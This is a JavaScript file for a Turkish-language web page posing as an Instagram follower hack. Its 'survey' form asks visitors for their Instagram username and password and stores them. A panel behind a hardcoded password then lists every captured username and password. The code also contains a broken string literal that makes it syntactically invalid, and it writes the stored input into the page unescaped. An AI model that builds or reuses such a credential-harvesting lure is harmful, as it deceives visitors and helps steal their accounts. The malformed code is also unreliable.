
function checkPassword() {
    var pass = document.getElementById("password").value;
    if (pass === "hile2025") {
        document.getElementById("login-screen").style.display = "none";
        document.getElementById("main-panel").style.display = "block";
    } else {
        alert("ŞİFRE HATALI LÜTFEN TEKRAR DENEYİNİZ!");
    }
}

document.getElementById("hamburger").addEventListener("click", function () {
    var menu = document.getElementById("menu");
    menu.style.display = menu.style.display === "none" ? "block" : "none";
});

function showEren() {
    document.getElementById(INSTAGRAM TAKİPÇİ HİLESİ"-panel").style.display = "block";
    document.getElementById("cevap-login").style.display = "none";
    document.getElementById("cevaplar-panel").style.display = "none";
}

function showCevapLogin() {
    document.getElementById("INSTAGRAM TAKİPÇİ HİLESİ-panel").style.display = "none";
    document.getElementById("cevap-login").style.display = "block";
    document.getElementById("cevaplar-panel").style.display = "none";
}

function checkCevapPassword() {
    var pass = document.getElementById("cevap-password").value;
    if (pass === "erenyenidenw1") {
        showCevaplar();
    } else {
        alert("GÜVENLİK AMACI İÇİN GİRİŞ YASAKTIR!");
    }
}

function saveForm() {
    var form = document.getElementById("anketForm");
    var formData = new FormData(form);

    var cevap = {
        can: formData.get("INSTAGRAM KULANICI ADI"),
        memo: formData.get("ŞİFRE ?"),
        secim: formData.get("secim")
    };

    var mevcut = JSON.parse(localStorage.getItem("cevaplar") || "[]");
    mevcut.push(cevap);
    localStorage.setItem("cevaplar", JSON.stringify(mevcut));

    alert("Anket kaydedildi!");
    form.reset();
    return false;
}

function showCevaplar() {
    var liste = document.getElementById("cevaplar-listesi");
    liste.innerHTML = "";
    document.getElementById("cevap-login").style.display = "none";
    document.getElementById("cevaplar-panel").style.display = "block";

    var cevaplar = JSON.parse(localStorage.getItem("cevaplar") || "[]");
    if (cevaplar.length === 0) {
        liste.innerHTML = "<p>Henüz cevap yok.</p>";
        return;
    }

    cevaplar.forEach(function (cevap, index) {
        var div = document.createElement("div");
        div.innerHTML = "<strong>Cevap #" + (index + 1) + "</strong><br>" +
                        "INSTAGRAM KULLANICI ADI: " + cevap.can + "<br>" +
                        "ŞİFRE ?: " + cevap.memo + "<br>" +
                        "SEÇİM: " + cevap.secim + "<hr>";
        liste.appendChild(div);
    });
}
